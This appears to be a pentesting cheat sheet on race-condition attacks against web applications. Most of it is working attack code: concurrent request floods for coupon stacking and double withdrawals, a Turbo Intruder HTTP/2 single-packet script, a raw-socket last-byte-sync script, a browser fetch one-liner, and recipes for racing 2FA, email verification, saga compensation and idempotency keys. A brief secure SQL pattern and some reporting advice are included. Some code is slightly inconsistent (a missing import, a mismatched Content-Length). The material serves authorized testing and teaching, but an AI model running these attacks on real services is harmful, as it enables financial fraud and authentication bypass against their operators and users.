---
tags:
  - high
  - logic
---

# Race Conditions

Exploit timing gaps between check and use operations by sending concurrent requests.

## TL;DR

```python
import asyncio, httpx
async def race():
    async with httpx.AsyncClient() as c:
        await asyncio.gather(*[c.post('https://target/redeem', data={'code':'PROMO'}) for _ in range(50)])
asyncio.run(race())
```

## How It Works

1. Application checks a condition (balance, limit, permission)
2. **Race window** exists before the action completes
3. Multiple concurrent requests slip through during the window
4. Each request sees the original state → all succeed

## Detection

### Target Endpoints

| Type | Examples |
|------|----------|
| Limit-enforced | Coupon redemption, wallet transfers, rating systems |
| Resource quotas | File/folder limits, seat limits, API calls |
| Multi-step flows | Email verification, 2FA setup, password reset |
| Stateful ops | Session creation, OAuth tokens, subscriptions |

### Signals

- Resource counters exceed expected limits
- Multiple successful responses during concurrent requests
- State changes without proper authorization

## Exploitation

### HTTP/2 Single-Packet Attack (Most Reliable)

All requests arrive simultaneously via single TCP packet:

**Turbo Intruder:**
```python
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=1,
                           engine=Engine.BURP2)  # HTTP/2
    for i in range(50):
        engine.queue(target.req, gate='race1')
    engine.openGate('race1')
```

**Caido:** Repeater → Select requests → Right-click → "Send group in parallel"

### HTTP/1.1 Last-Byte Sync

When HTTP/2 unavailable:

1. Send headers + body minus final byte for all requests
2. Wait 100ms for TCP buffering
3. Send all final bytes simultaneously

### Common Attack Patterns

**Coupon/Promo Stacking:**
```bash
for i in {1..50}; do
    curl -X POST 'https://target/redeem' -d 'code=PROMO20' &
done; wait
```

**Resource Limit Bypass:**
```python
# Race against 10-folder limit → create 15+
tasks = [create_folder(f'folder_{i}') for i in range(20)]
await asyncio.gather(*tasks)
```

**Payment/Transfer Race:**
```python
# Simultaneous withdrawals exceeding balance
async def withdraw():
    return await client.post('/withdraw', json={'amount': 100})
await asyncio.gather(*[withdraw() for _ in range(10)])
```

### Hidden Substates

**2FA Bypass - Session State Race:**
```python
# Session created before 2FA flag set
session['userid'] = user.userid
if user.mfa_enabled:
    session['enforce_mfa'] = True  # Race window!
```

Race parallel requests during the gap between session creation and MFA flag.

**Email Verification Race:**
1. Register account
2. Immediately send requests with empty/null confirmation token
3. Race between token generation and database write

## Bypasses

### Session-Based Locking
PHP serializes requests by session.  
**Fix:** Use different session tokens per request.

### Connection Warming
```python
engine.queue(dummy_request)  # Warm connection
time.sleep(0.1)
for i in range(50):
    engine.queue(attack_request, gate='race1')
```

### Server Concurrency Limits
- Apache: 100 concurrent streams
- Nginx: 128, NodeJS: unlimited

**Bypass:** Open multiple connections, spread race across them.

## Real Examples

| Target | Bug | Impact |
|--------|-----|--------|
| HackerOne | Duplicate retest payment | $500 paid twice |
| Instacart | Coupon stacking | Unlimited discounts |
| HackerOne | Folder limit bypass | 10→15+ folders |
| Badoo | Premium trial racing | 3→9+ days free |
| VendHQ | Loyalty claim racing | 100→5000 points |

## Tools

| Tool | Use Case |
|------|----------|
| **Turbo Intruder** | HTTP/2 single-packet, custom gates |
| **Caido Replay** | "Send group in parallel" |
| **H2SpaceX** | Python HTTP/2 last-byte sync |

**Browser DevTools Quick Test:**
```javascript
Promise.all([...Array(20)].map(() => 
    fetch('/api/redeem', {method: 'POST', body: 'code=TEST', credentials: 'include'})
))
```

## Secure Pattern

```sql
-- Atomic constraint
UPDATE coupons SET uses = uses + 1 
WHERE code = ? AND uses < max_uses
RETURNING *;  -- Fails if already at limit
```

---

## Advanced Synchronization Techniques

### Last-Byte Sync (HTTP/1.1)

When HTTP/2 is unavailable, control arrival timing by holding the final byte:

**Concept:**
1. Send headers + body minus the last byte for all requests
2. TCP buffering keeps requests pending
3. Send all final bytes simultaneously → precise synchronization

**Implementation:**
```python
import socket

def last_byte_sync(host, port, requests, count=10):
    sockets = []
    
    # Open connections and send N-1 bytes
    for i in range(count):
        s = socket.socket()
        s.connect((host, port))
        body = f"POST /api/redeem HTTP/1.1\r\nHost: {host}\r\nContent-Length: 15\r\n\r\ncode=PROMO2"
        s.send(body[:-1].encode())  # All except last byte
        sockets.append(s)
    
    time.sleep(0.1)  # Let TCP buffers fill
    
    # Send final byte to all simultaneously
    for s in sockets:
        s.send(b'0')  # Final char
    
    # Read responses
    for s in sockets:
        print(s.recv(1024))
        s.close()
```

### HTTP/2 Single-Packet Details

**Why it works:**
- HTTP/2 multiplexes streams over single TCP connection
- Multiple requests fit in one TCP packet
- Server processes all simultaneously → maximum collision probability

**Frame Structure:**
```
TCP Packet:
├── SETTINGS frame
├── HEADERS frame (stream 1)
├── DATA frame (stream 1)
├── HEADERS frame (stream 3)
├── DATA frame (stream 3)
├── HEADERS frame (stream 5)
└── DATA frame (stream 5)
```

**Advantages over HTTP/1.1:**
- No connection warmup needed
- Guaranteed simultaneity (single packet = atomic arrival)
- Bypasses connection-based rate limits
- More streams per connection (default: 100-128)

### Saga/Compensation Race Conditions

**Pattern:** Event-driven systems using saga pattern for distributed transactions.

**Vulnerable Flow:**
```
1. OrderCreated event → Reserve inventory
2. PaymentProcessed event → Confirm order
3. PaymentFailed event → Release inventory (compensation)
```

**Race Exploitation:**
```
Timeline:
T0: Submit order-1 → Inventory: 10 → 9
T1: Submit order-2 (race) → Inventory: 10 → 9 (reads before update)
T2: Payment-1 fails → Compensation releases → 9 → 10
T3: Payment-2 succeeds → Order confirmed with phantom inventory
```

**Detection Points:**
- Event processing without optimistic locking
- Compensation logic that doesn't verify original state
- Read-then-write patterns in event handlers
- Missing idempotency keys on event consumption

**Attack Example:**
```python
async def saga_race():
    # Trigger multiple orders
    orders = await asyncio.gather(*[
        create_order(item_id='RARE_ITEM', qty=1) 
        for _ in range(5)
    ])
    
    # Cancel some immediately (trigger compensation)
    await asyncio.gather(*[
        cancel_order(orders[0]['id']),
        cancel_order(orders[1]['id'])
    ])
    
    # Remaining orders may succeed despite stock exhaustion
```

**Real-World Targets:**
- Microservices with event sourcing
- Order processing systems
- Reservation/booking platforms
- Inventory management with distributed state

### Amplification Techniques

**Cache-Before-Commit Race:**
```
1. Transaction starts
2. Optimistic cache write (performance optimization)
3. DB commit pending
4. Race: Read from cache before commit
5. Transaction rolls back → cache contains phantom data
```

**Idempotency Key Bypass:**
```http
# Scope vulnerability: key without principal binding
POST /api/transfer
Idempotency-Key: abc123
From-Account: attacker
Amount: 100

POST /api/transfer  
Idempotency-Key: abc123
From-Account: victim  # Different account, same key!
Amount: 100
```

**Multi-Phase Attacks:**
```
Phase 1: Saturate worker queue with slow requests
Phase 2: Launch race during peak load
Result: Wider race window due to processing delays
```

### Detection Methodology

**Proof Requirements:**
```bash
# Capture precise timing with correlation IDs
# Include in bug report:

Request-ID: req-001 | Timestamp: 10:00:00.000 | Action: CHECK balance=100
Request-ID: req-002 | Timestamp: 10:00:00.001 | Action: CHECK balance=100
Request-ID: req-001 | Timestamp: 10:00:00.150 | Action: DEBIT 100
Request-ID: req-002 | Timestamp: 10:00:00.152 | Action: DEBIT 100
Final: balance=-100 (CRITICAL: Double spend)
```

**Quantifying Impact:**
```
Impact Formula:
- Unit loss: $50 per coupon
- Race window: 50ms
- Successful concurrent requests: 10
- Total loss: $500 per attack
- Repeatability: Unlimited
→ Severity: Critical
```
